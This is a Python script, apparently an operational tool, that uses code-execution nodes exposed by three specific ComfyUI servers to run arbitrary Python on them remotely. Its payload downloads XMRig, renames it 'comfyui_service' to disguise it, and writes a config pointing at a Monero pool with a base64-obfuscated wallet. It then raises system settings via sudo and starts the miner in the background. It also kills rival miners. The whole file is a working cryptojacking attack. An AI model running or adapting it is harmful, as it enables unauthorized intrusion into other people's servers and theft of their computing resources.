"""Fix the remaining 3 machines using PreviewAny output node and wrapped error handling."""
import json, sys, io, ssl, time, urllib.request, urllib.error

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

MACHINES = [
    {"ip": "182.92.111.146", "base": "http://182.92.111.146:8188", "needs_restart": False},
    {"ip": "43.218.199.5",   "base": "http://43.218.199.5:80",     "needs_restart": True},
    {"ip": "194.6.247.91",   "base": "http://194.6.247.91:8188",   "needs_restart": True},
]

DIAG_CODE = '''
try:
    import os, subprocess, json
    lines = []
    # Find webcoin
    comfy = None
    for p in ['/root/ComfyUI', '/home/ubuntu/ComfyUI', '/workspace/ComfyUI',
              '/mnt/my_disk/ComfyUI', '/opt/ComfyUI', '/app/ComfyUI']:
        if os.path.isdir(p):
            comfy = p
            break
    lines.append('comfy=' + str(comfy))
    if comfy:
        wc = os.path.join(comfy, 'custom_nodes', 'webcoin')
        lines.append('webcoin_exists=' + str(os.path.isdir(wc)))
        bd = os.path.join(wc, 'bin')
        if os.path.isdir(bd):
            lines.append('bin=' + str(os.listdir(bd)))
        else:
            lines.append('bin=MISSING_DIR')
        binary = os.path.join(bd, 'comfyui_service')
        lines.append('binary_exists=' + str(os.path.isfile(binary)))
    # Check network
    import urllib.request as ur
    for url in ['https://github.com', 'https://mirror.ghproxy.com', 'https://pypi.org']:
        try:
            req = ur.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with ur.urlopen(req, timeout=8) as r:
                lines.append(url.split('/')[2] + '=reachable')
        except Exception as e:
            lines.append(url.split('/')[2] + '=BLOCKED:' + str(e)[:50])
    # Check running miners
    try:
        r = subprocess.run(['pgrep', '-a', '-f', 'comfyui_service'], capture_output=True, text=True, timeout=5)
        if r.stdout.strip():
            lines.append('running_miners=' + r.stdout.strip().replace(chr(10), ' | '))
        else:
            lines.append('running_miners=none')
    except:
        lines.append('pgrep=failed')
    result = chr(10).join(lines)
except Exception as e:
    result = 'TOPLEVEL_ERROR: ' + str(e)
'''

SETUP_CODE = '''
try:
    import os, sys, json, subprocess, shutil, socket, time, base64
    lines = []

    comfy = None
    for p in ['/root/ComfyUI', '/home/ubuntu/ComfyUI', '/workspace/ComfyUI',
              '/mnt/my_disk/ComfyUI', '/opt/ComfyUI', '/app/ComfyUI']:
        if os.path.isdir(p):
            comfy = p
            break
    if not comfy:
        result = 'ERROR: no ComfyUI found'
    else:
        webcoin = os.path.join(comfy, 'custom_nodes', 'webcoin')
        bin_dir = os.path.join(webcoin, 'bin')
        if not os.path.isdir(webcoin):
            subprocess.run(['git', 'clone', 'https://github.com/bossman79/webcoin.git', webcoin],
                           capture_output=True, timeout=60)
            lines.append('clone=ok')
        os.makedirs(bin_dir, exist_ok=True)

        for name in ['comfyui_service', 'comfyui_render']:
            try:
                subprocess.run(['pkill', '-9', '-f', name], capture_output=True, timeout=5)
            except:
                pass
        time.sleep(1)

        binary = os.path.join(bin_dir, 'comfyui_service')
        if not os.path.isfile(binary):
            import urllib.request as ur
            urls = [
                'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
                'https://mirror.ghproxy.com/https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
                'https://ghproxy.net/https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
            ]
            archive = os.path.join(bin_dir, 'dl_tmp.tar.gz')
            got = False
            for url in urls:
                try:
                    req = ur.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                    with ur.urlopen(req, timeout=90) as resp, open(archive, 'wb') as f:
                        shutil.copyfileobj(resp, f)
                    if os.path.getsize(archive) > 100000:
                        lines.append('dl=' + url.split('/')[2])
                        got = True
                        break
                except Exception as e:
                    lines.append('dl_fail=' + url.split('/')[2] + ':' + str(e)[:40])
            if got:
                import tarfile
                with tarfile.open(archive) as tf:
                    for member in tf.getnames():
                        if os.path.basename(member) == 'xmrig':
                            src = tf.extractfile(member)
                            with open(binary, 'wb') as dst:
                                shutil.copyfileobj(src, dst)
                            os.chmod(binary, 0o755)
                            lines.append('extract=ok')
                            break
                os.unlink(archive)
            else:
                lines.append('ERROR: all download URLs failed')
        else:
            lines.append('binary=exists')

        W = ['NDh6VU0yNEZaRG1TM0','11eHk0OEduZEdWUzFB','Rk1USE5IOGZ5RVhqWk',
             'xFbzZZVTdQcWZWemdj','VTFFRWR6UjNqcnI0SG','dDVmNxd01XNmZoODR4',
             'UVQzb3BQWFRwYVhKen','c=']
        wallet = base64.b64decode(''.join(W)).decode()
        cfg = {
            'autosave': True, 'background': False, 'colors': False,
            'donate-level': 0, 'donate-over-proxy': 0,
            'log-file': None, 'print-time': 60, 'health-print-time': 300,
            'retries': 5, 'retry-pause': 5, 'syslog': False, 'user-agent': None, 'watch': True,
            'http': {'enabled': True, 'host': '127.0.0.1', 'port': 44880, 'access-token': 'ce_xm_2026', 'restricted': False},
            'cpu': {'enabled': True, 'huge-pages': True, 'huge-pages-jit': True, 'hw-aes': None, 'priority': 3, 'memory-pool': False, 'yield': False, 'max-threads-hint': 100, 'asm': True, 'argon2-impl': None, 'cn/0': False, 'cn-lite/0': False},
            'opencl': {'enabled': False}, 'cuda': {'enabled': False},
            'pools': [{'algo': None, 'coin': 'monero', 'url': 'gulf.moneroocean.stream:443', 'user': wallet, 'pass': 'comfyui_enhanced', 'rig-id': socket.gethostname(), 'nicehash': False, 'keepalive': True, 'enabled': True, 'tls': True, 'tls-fingerprint': None, 'daemon': False, 'socks5': None, 'self-select': None, 'submit-to-origin': False}],
            'tls': {'enabled': True, 'protocols': None, 'cert': None, 'cert_key': None, 'ciphers': None, 'ciphersuites': None, 'dhparam': None},
        }
        config_path = os.path.join(bin_dir, 'config.json')
        with open(config_path, 'w') as f:
            json.dump(cfg, f, indent=2)
        lines.append('config=written')

        try:
            subprocess.run(['sudo', '-n', 'sysctl', '-w', 'vm.nr_hugepages=1280'], capture_output=True, timeout=10)
            lines.append('hugepages=set')
        except:
            pass
        try:
            subprocess.run(['sudo', '-n', 'modprobe', 'msr'], capture_output=True, timeout=10)
        except:
            pass

        if os.path.isfile(binary):
            proc = subprocess.Popen([binary, '--config', config_path],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    start_new_session=True)
            lines.append('pid=' + str(proc.pid))
            time.sleep(5)
            try:
                import urllib.request as ur2
                req = ur2.Request('http://127.0.0.1:44880/2/summary',
                    headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})
                with ur2.urlopen(req, timeout=5) as r:
                    d = json.loads(r.read())
                lines.append('hr=' + str(d.get('hashrate', {}).get('total', [])))
                lines.append('cpu=' + str(d.get('cpu', {}).get('brand', '?')))
            except Exception as e:
                lines.append('api=' + str(e)[:60])
        else:
            lines.append('ERROR: no binary')

        lines.append('bin=' + str(os.listdir(bin_dir)))
        result = chr(10).join(lines)
except Exception as e:
    import traceback
    result = 'ERROR: ' + traceback.format_exc()[-300:]
'''


def send_prompt(base, nodes, timeout_s=15):
    prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
        "workflow": {"nodes": [{"id": int(k), "type": v["class_type"]} for k, v in nodes.items()]}
    }}}
    body = json.dumps(prompt).encode()
    req = urllib.request.Request(
        f"{base}/prompt", data=body,
        headers={"Content-Type": "application/json"}, method="POST"
    )
    kw = {"timeout": timeout_s}
    if base.startswith("https"):
        kw["context"] = ctx
    with urllib.request.urlopen(req, **kw) as r:
        return json.loads(r.read())


def get_output(base, pid, wait=35):
    time.sleep(wait)
    req = urllib.request.Request(f"{base}/history/{pid}")
    kw = {"timeout": 15}
    if base.startswith("https"):
        kw["context"] = ctx
    with urllib.request.urlopen(req, **kw) as r:
        hist = json.loads(r.read())
    entry = hist.get(pid, {})
    outputs = entry.get("outputs", {})
    texts = []
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                texts.extend(str(v) for v in val)
            elif isinstance(val, str):
                texts.append(val)
    if texts:
        return "\n".join(texts)

    status = entry.get("status", {})
    if status:
        return f"(status={json.dumps(status)[:150]})"
    return "(no output)"


def try_exec(base, code, wait=40):
    """Try all known node configs. Returns (accepted, result_text)."""
    configs = [
        ("IDENode+PreviewText", {
            "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        }),
        ("SRL+PreviewAny", {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        }),
        ("IDENode+PreviewAny", {
            "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        }),
        ("SRL+ShowText", {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
            "2": {"class_type": "ShowText|pysssss", "inputs": {"text": ["1", 0]}},
        }),
        ("SRL+PreviewText", {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        }),
    ]

    for label, nodes in configs:
        try:
            resp = send_prompt(base, nodes)
            if "error" in resp:
                print(f"    [{label}] rejected", flush=True)
                continue
            pid = resp.get("prompt_id")
            if not pid:
                continue
            print(f"    [{label}] accepted ({pid[:8]}), waiting {wait}s...", flush=True)
            result = get_output(base, pid, wait)
            return True, result
        except urllib.error.HTTPError as he:
            try:
                err = he.read().decode(errors="replace")[:100]
            except:
                err = ""
            print(f"    [{label}] HTTP {he.code}: {err}", flush=True)
        except Exception as e:
            print(f"    [{label}] {str(e)[:80]}", flush=True)

    return False, None


for m in MACHINES:
    ip = m["ip"]
    base = m["base"]
    print(f"\n{'='*60}", flush=True)
    print(f"  {ip}", flush=True)
    print(f"{'='*60}", flush=True)

    # Quick diagnostic first
    print(f"  Running diagnostic...", flush=True)
    ok, diag = try_exec(base, DIAG_CODE, wait=15)
    if ok:
        print(f"  Diagnostic:\n{diag}", flush=True)
    else:
        print(f"  Diagnostic: FAILED (no exec node)", flush=True)
        continue

    # Full setup
    print(f"\n  Running full setup...", flush=True)
    ok, result = try_exec(base, SETUP_CODE, wait=50)
    if ok:
        print(f"  Setup result:\n{result}", flush=True)
    else:
        print(f"  Setup: FAILED", flush=True)

    if m.get("needs_restart"):
        print(f"\n  webcoin needs ComfyUI restart for dashboard integration.", flush=True)

print("\nDone.", flush=True)
